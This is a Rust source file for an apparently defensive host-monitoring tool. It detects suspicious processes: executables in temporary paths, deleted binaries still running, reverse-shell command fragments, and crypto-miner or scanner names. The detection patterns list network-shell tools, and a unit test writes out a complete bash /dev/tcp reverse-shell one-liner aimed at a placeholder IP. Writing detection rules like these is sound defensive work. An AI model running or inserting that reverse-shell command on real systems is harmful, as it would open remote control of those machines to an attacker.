use crate::detectors::{evidence, path_is_allowlisted, string_field, DetectContext, Detector};
use crate::rules::model::RuleMetadata;
use sentinel_core::{Category, Finding, RawEvent, Severity};

pub struct ProcessDetector;

impl Detector for ProcessDetector {
    fn name(&self) -> &'static str {
        "process_rules"
    }

    fn rules(&self) -> Vec<RuleMetadata> {
        vec![
            RuleMetadata::new(
                "PROC-001",
                "Process running from temporary path",
                Category::Process,
                Severity::High,
                "A process executable path is under a suspicious temporary directory.",
            ),
            RuleMetadata::new(
                "PROC-002",
                "Deleted executable still running",
                Category::Process,
                Severity::High,
                "A process executable appears to be deleted while still running.",
            ),
            RuleMetadata::new(
                "PROC-003",
                "Reverse shell command pattern",
                Category::Process,
                Severity::Critical,
                "A process command line contains reverse shell style fragments.",
            ),
            RuleMetadata::new(
                "PROC-004",
                "Possible miner or scanner process",
                Category::Process,
                Severity::Critical,
                "A process command line contains common miner or scanner names.",
            ),
        ]
    }

    fn detect(&self, events: &[RawEvent], ctx: &DetectContext) -> Vec<Finding> {
        let mut findings = Vec::new();
        for event in events
            .iter()
            .filter(|event| event.kind == "process_snapshot")
        {
            let exe_path = string_field(event, "exe_path");
            let cmdline = string_field(event, "cmdline");
            if path_is_allowlisted(&exe_path, &ctx.config.allowlist.process_paths) {
                continue;
            }
            if exe_path.contains(" (deleted)") || exe_path.ends_with("deleted") {
                findings.push(deleted_executable(event, ctx));
            }
            if process_from_suspicious_dir(&exe_path, ctx) {
                findings.push(temp_process(event, ctx));
            }
            if contains_reverse_shell_pattern(&cmdline) {
                findings.push(reverse_shell(event, ctx));
            }
            if contains_miner_or_scanner(&cmdline) {
                findings.push(miner_or_scanner(event, ctx));
            }
        }
        findings
    }
}

fn temp_process(event: &RawEvent, ctx: &DetectContext) -> Finding {
    let subject = string_field(event, "pid");
    Finding::new(
        &ctx.host_id,
        "Process executable in temporary path",
        "A running process executable is located in a path commonly abused for malware staging.",
        Severity::High,
        Category::Process,
        "PROC-001",
        subject,
    )
    .with_evidence(process_evidence(event))
    .with_recommendations(vec![
        "Inspect the executable hash, parent process, and file owner.".to_string(),
        "Preserve evidence before stopping or removing the process.".to_string(),
    ])
}

fn deleted_executable(event: &RawEvent, ctx: &DetectContext) -> Finding {
    Finding::new(
        &ctx.host_id,
        "Deleted executable still running",
        "A process executable path indicates the backing file was deleted while the process remains active.",
        Severity::High,
        Category::Process,
        "PROC-002",
        string_field(event, "pid"),
    )
    .with_evidence(process_evidence(event))
    .with_recommendations(vec![
        "Capture process details and network connections before termination.".to_string(),
        "Review how the process was launched.".to_string(),
    ])
}

fn reverse_shell(event: &RawEvent, ctx: &DetectContext) -> Finding {
    Finding::new(
        &ctx.host_id,
        "Reverse shell command pattern detected",
        "A process command line contains fragments commonly used for reverse shells.",
        Severity::Critical,
        Category::Process,
        "PROC-003",
        string_field(event, "pid"),
    )
    .with_evidence(process_evidence(event))
    .with_impact(vec![
        "This may indicate active remote command execution.".to_string()
    ])
    .with_recommendations(vec![
        "Isolate network access if the process is unauthorized.".to_string(),
        "Preserve command line, executable, and parent process evidence.".to_string(),
    ])
}

fn miner_or_scanner(event: &RawEvent, ctx: &DetectContext) -> Finding {
    Finding::new(
        &ctx.host_id,
        "Possible miner or scanner process",
        "A process command line contains common miner or scanner indicators.",
        Severity::Critical,
        Category::Process,
        "PROC-004",
        string_field(event, "pid"),
    )
    .with_evidence(process_evidence(event))
    .with_recommendations(vec![
        "Check CPU/network usage and whether the binary was intentionally installed.".to_string(),
        "Rotate credentials if compromise is confirmed.".to_string(),
    ])
}

fn process_evidence(event: &RawEvent) -> Vec<sentinel_core::Evidence> {
    vec![
        evidence("pid", string_field(event, "pid")),
        evidence("ppid", string_field(event, "ppid")),
        evidence("name", string_field(event, "name")),
        evidence("exe_path", string_field(event, "exe_path")),
        evidence("cmdline", string_field(event, "cmdline")),
    ]
}

fn process_from_suspicious_dir(path: &str, ctx: &DetectContext) -> bool {
    path_in_suspicious_dirs(path, &ctx.config.process.suspicious_dirs)
}

pub(crate) fn path_in_suspicious_dirs(path: &str, dirs: &[std::path::PathBuf]) -> bool {
    dirs.iter().any(|dir| {
        let prefix = dir.to_string_lossy().replace('\\', "/");
        path == prefix || path.starts_with(&format!("{prefix}/"))
    })
}

pub(crate) fn contains_reverse_shell_pattern(command: &str) -> bool {
    let lowered = command.to_ascii_lowercase();
    [
        "/dev/tcp/",
        "bash -i",
        "nc -e",
        "socat ",
        "python -c",
        "perl -e",
    ]
    .iter()
    .any(|marker| lowered.contains(marker))
}

pub(crate) fn contains_miner_or_scanner(command: &str) -> bool {
    let lowered = command.to_ascii_lowercase();
    ["xmrig", "kinsing", "masscan", "zmap"]
        .iter()
        .any(|marker| lowered.contains(marker))
}

#[cfg(test)]
mod tests {
    use super::{contains_miner_or_scanner, contains_reverse_shell_pattern};

    #[test]
    fn process_patterns_match_known_bad_fragments() {
        assert!(contains_reverse_shell_pattern(
            "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"
        ));
        assert!(contains_miner_or_scanner("/tmp/xmrig -o pool"));
        assert!(!contains_miner_or_scanner("/usr/bin/sshd"));
    }
}
